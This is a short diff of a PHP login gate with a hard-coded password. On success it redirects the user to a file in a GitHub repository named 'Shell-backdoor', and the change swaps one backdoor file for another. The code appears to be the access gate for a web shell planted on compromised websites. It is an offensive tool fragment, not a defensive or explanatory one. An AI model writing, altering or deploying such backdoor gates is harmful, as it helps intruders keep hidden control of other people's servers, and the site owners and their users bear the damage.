@@ -12,7 +12,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $password = $_POST['password'];
     if ($password === 'tan') {
         $_SESSION['loggedin'] = true;
-        header("Location: https://raw.githubusercontent.com/TanXploit/Shell-backdoor/main/alfareal.php");
+        header("Location: https://raw.githubusercontent.com/TanXploit/Shell-backdoor/main/user.php");
         exit;
     } else {
         $error = "Password salah!";
